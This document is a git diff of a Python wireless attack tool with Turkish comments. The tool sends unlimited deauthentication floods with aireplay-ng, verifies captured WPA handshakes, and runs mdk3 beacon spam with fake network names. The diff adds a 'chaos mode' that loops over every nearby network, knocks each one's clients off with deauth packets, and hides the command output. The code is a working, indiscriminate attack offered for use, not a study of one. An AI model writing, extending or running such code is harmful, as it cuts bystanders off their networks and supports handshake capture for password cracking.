@@ -2,10 +2,12 @@ import subprocess
 import os
 import random
 import string
+import time
+from modules import radar
+from modules import engine
 
 def pulse_kick(iface, bssid, client=None, timer=0):
     print(f"\n    [*] Vuruş başlatılıyor... (Süre: {'Sınırsız' if timer==0 else str(timer)+' sn'})")
-    # 0 parametresi sınırsız paket yollar (Durdurana kadar)
     cmd = f"sudo aireplay-ng -0 0 -a {bssid}"
     if client: cmd += f" -c {client}"
     cmd += f" {iface}"
@@ -30,11 +32,10 @@ def verify_handshake(cap_file):
         print("    [✔] MÜKEMMEL! Geçerli bir Handshake yakalandı.")
         return True
     else:
-        print("    [✘] Handshake bulunamadı. Hedefi daha sert düşürmen lazım.")
+        print("    [✘] Handshake bulunamadı! (İpucu: Ağda bağlı kimse olmayabilir veya cihaza daha çok yaklaşman gerekebilir. Süreyi uzatarak tekrar dene.)")
         return False
 
 def beacon_spam(iface):
-    # HATA BURADAYDI: Renk kodlarını f-string parantezlerinden çıkartıp direkt metne yazdık
     print("\n    \033[96m[*] BEACON SPAM (Sahte Ağ Yayma) MODU\033[0m")
     print("    \033[93m[1]\033[0m Varsayılan Troll Listesi (Eğlenceli İsimler)")
     print("    \033[93m[2]\033[0m Rastgele İsimler Üret (Kaos Modu)")
@@ -86,3 +87,39 @@ def beacon_spam(iface):
         print("\n    [✔] Spam durduruldu. Hava sahası temizlendi.")
     except Exception as e:
         print("\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")
+
+# ==========================================
+# YENİ: CHAOS MODU (OTOMATİK KİTLE İMHA)
+# ==========================================
+def chaos_mode(iface):
+    print("\n    \033[91m\033[1m[!] CHAOS MODU AKTİF EDİLDİ [!]\033[0m")
+    print("    \033[91m[*] Program etraftaki tüm ağları sırayla gezip deauth atacak.\033[0m")
+    print("    \033[91m[*] Durdurana kadar döngü devam eder. (Durdurmak için CTRL+C)\033[0m")
+    time.sleep(2)
+    
+    try:
+        while True:
+            # 5 saniyelik hızlı tarama atıyoruz
+            networks = radar.auto_scan_and_select(iface, scan_time=5)
+            
+            if not networks:
+                print("    [!] Etrafta ağ bulunamadı. 5 saniye sonra tekrar taranacak...")
+                time.sleep(5)
+                continue
+            
+            print(f"\n    [*] {len(networks)} hedef kilitlendi! Yok etme protokolü başlatılıyor...")
+            time.sleep(1)
+            
+            for net in networks:
+                print(f"\n    [>] Hedef Vuruluyor: {net['essid']} (Kanal: {net['ch']})")
+                
+                # Cihazın kanalını hedefin kanalına eşitliyoruz
+                engine.run_cmd(f"sudo iwconfig {iface} channel {net['ch']}")
+                
+                # Hedefe 50 adet seri deauth paketi fırlatıyoruz
+                # Terminal kirlenmesin diye çıktıları gizliyoruz
+                cmd = f"sudo aireplay-ng -0 50 -a {net['bssid']} {iface}"
+                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+    except KeyboardInterrupt:
+        print("\n    \033[92m[✔] Chaos Modu durduruldu. Ortalık sakinleşti.\033[0m")
